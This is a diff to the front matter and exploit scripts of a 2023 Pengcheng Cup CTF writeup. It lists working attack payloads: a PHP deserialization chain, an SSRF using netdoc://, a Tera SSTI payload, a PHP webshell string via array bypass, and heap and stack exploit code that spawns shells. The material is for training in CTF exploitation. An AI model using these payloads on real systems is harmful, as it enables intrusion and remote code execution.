@@ -28,7 +28,23 @@ tags:
 - environ栈泄露
 - XOR0x23 PE还原
 - RC4密钥th3k3y
-attack_chain: PHP 反序列化链 H→welcome→A→C→E→K→R→Hacker.system(cat /flag) → postman /proxy/url?url=netdoc:///flag%23.html → Tera raw data `{% set t="galf"|reverse %}{% set f=get_env(name=t,default="123") %}{% if f is matching('canshu.*') %}aaaaa{% endif %}` 双 ^fla.. 爆破 → glob:// 脚本逐字符爆破 backdoor_xxx → username=admin&title[]=2.php&data[]=<?=`tac /f*` 数组绕 strlen → PWN silent 栈溢出 + magic gadget 改 _IO_2_1_stdout_ 指向 syscall;ret → babyheap off_by_null + unlink 重叠 + environ 栈泄露 + ROP system(/bin/sh) → bad_pe 全文件异或 0x23 → RC4 密钥 th3k3y! 解密
+attack_chain:
+- 'PHP 反序列化链 H'
+- 'welcome'
+- 'A'
+- 'C'
+- 'E'
+- 'K'
+- 'R'
+- 'Hacker.system(cat /flag)'
+- 'postman /proxy/url?url=netdoc:///flag%23.html'
+- 'Tera raw data `{% set t="galf"|reverse %}{% set f=get_env(name=t,default="123") %}{% if f is matching(''canshu.*'') %}aaaaa{% endif %}` 双 ^fla.. 爆破'
+- 'glob:// 脚本逐字符爆破 backdoor_xxx'
+- 'username=admin&title[]=2.php&data[]=<?=`tac /f*` 数组绕 strlen'
+- 'PWN silent 栈溢出 + magic gadget 改 _IO_2_1_stdout_ 指向 syscall;ret'
+- 'babyheap off_by_null + unlink 重叠 + environ 栈泄露 + ROP system(/bin/sh)'
+- 'bad_pe 全文件异或 0x23'
+- 'RC4 密钥 th3k3y! 解密'
 key_payload: netdoc:///flag%23.html ; username=admin&title[]=2.php&data[]=<?=`tac%20/f*` ; payload = b"A"*0x48 + p64(csu_1) + ... + p64(leave_ret) ; RC4('th3k3y!') ^ [0xBD, 0xF0, 0x4C, ...]
 one_liner: PHP 反序列化 + Spring Boot Swagger + Tera SSTI + 数组绕 strlen + ORW + babyheap off_by_null + XOR0x23 PE。
 lesson: Tera Rust SSTI 走 get_env 旁路 + 数组绕 strlen 是 web 反复出现的 trick。
@@ -97,6 +113,9 @@ prerequisites:
 - glibc heap off_by_null 与 unlink 重叠原理
 - RC4 流密码与密钥恢复
 - PE 文件结构与 IDA 静态分析
+contest_normalized: "鹏程杯"
+contest_year: 2023
+subcategory_guess: "ssti"
 ---
 # 2023鹏程杯初赛Writeup
 
@@ -621,7 +640,7 @@ edit(2,p64(target^(heap_base+0x4e0>>12)))
 add(0x408,"An")
 # gdb.attach(p,"b *$rebase(0x000000000001572)")
 # sleep(2)
-add(0x408,p64(0)+p64(one_gadget)+b" 0"*0x200+b"n")
+add(0x408,p64(0)+p64(one_gadget)+b"\\x000"*0x200+b"n")
 p.interactive()
 
 Pwn-babyheap
@@ -1246,7 +1265,7 @@ edit(2,p64(target^(heap_base+0x4e0>>12)))
 add(0x408,"An")
 # gdb.attach(p,"b *$rebase(0x000000000001572)")
 # sleep(2)
-add(0x408,p64(0)+p64(one_gadget)+b" 0"*0x200+b"n")
+add(0x408,p64(0)+p64(one_gadget)+b"\\x000"*0x200+b"n")
 p.interactive()
 from pwn import*
 context(arch='i386', os='linux',log_level="debug")
